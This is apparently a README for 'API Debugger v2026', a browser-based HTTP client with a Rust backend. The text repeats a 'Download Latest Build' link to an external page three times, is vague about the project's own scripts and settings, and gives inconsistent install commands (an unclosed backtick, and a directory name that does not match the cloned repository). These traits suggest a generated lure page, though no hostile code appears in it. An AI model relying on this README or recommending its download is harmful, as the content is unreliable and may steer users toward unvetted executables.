# API Debugger v2026 - API testing tool 2026

> A local-first web API debugger for running HTTP requests in the browser, with fast request setup, offline-friendly workflows, and a current 2026 release.

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mattrqvnlewis5100/api-debugger-v2026?style=flat-square)](https://github.com/mattrqvnlewis5100/api-debugger-v2026)

---

<p align="center">
  <a href="https://mattrqvnlewis5100.github.io/api-debugger-v2026/">
    <img src="https://img.shields.io/badge/Download-API%20Debugger%20Latest-brightgreen?style=for-the-badge" alt="Download API Debugger">
  </a>
</p>

> **[Download Latest Build](https://mattrqvnlewis5100.github.io/api-debugger-v2026/)**

---

[Download Latest Build](https://mattrqvnlewis5100.github.io/api-debugger-v2026/)

---

## Overview

API Debugger is a browser-based HTTP client for exploring and validating APIs with a local-first workflow in mind. It gives developers and testers a simple place to compose requests, inspect responses, and iterate without depending on a large external toolchain.

The app is built for offline-friendly use and stores its data locally, which makes it useful for repeat testing and private development setups. Its frontend stays lightweight, while the backend uses Rust with Axum and Reqwest to deliver a responsive experience for day-to-day API work.

---

## What it offers

- Send GET, POST, PUT, and DELETE requests
- Add custom headers and request bodies
- View JSON responses with formatting and syntax highlighting
- Track request history for repeated testing
- Use a web frontend interface for interactive debugging
- Keep data in local storage for offline-first workflows
- Built with Rust, Axum, and Reqwest for the backend side
- Designed for quick API inspection and iterative request testing

---

## Installation

Get the code and launch the project from the repository root:

- `git clone https://github.com/mattrqvnlewis5100/api-debugger-v2026.git
- `cd api-debugger`

If the project includes a build or run script, execute it after setup and then open the web interface in your browser. For packaged builds, use the download link above and follow the launch steps included with the release.

---

## How to use it

1. Open the web app in your browser.
2. Choose the HTTP method you want to test.
3. Enter the target URL.
4. Add headers or a request body as needed.
5. Send the request and review the formatted response.
6. Revisit saved history entries when you want to repeat or compare calls.

Typical workflow:
- Test a single endpoint quickly
- Adjust headers or payloads between attempts
- Compare response output while iterating on an API

---

## Configuration

API Debugger stores its working data locally. If the project exposes settings, they are expected to live in the application data area or in the browser-side local storage used by the web frontend.

Example config shape:

    {
      "storage": "local",
      "history": true,
      "responseFormatting": true
    }

---

## Requirements

- Web browser for the frontend interface
- A local environment suitable for running the Rust-based backend
- Rust toolchain if you are building from source
- Network access for testing remote APIs, or offline use for local workflows
- Local storage available for request history and application data

---

## FAQ

**Does it work offline?**  
Yes. The project follows a local-first design and supports offline-oriented workflows where applicable.

**Where is request history stored?**  
History is saved locally as part of the app's storage model.

**Can I customize requests?**  
Yes. You can define the HTTP method, headers, and body for each request.

**What if a response is hard to read?**  
JSON responses are formatted and highlighted to make inspection easier.

**How do I get updates?**  
Use the latest download link or pull the newest changes from the repository when a new build is published.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
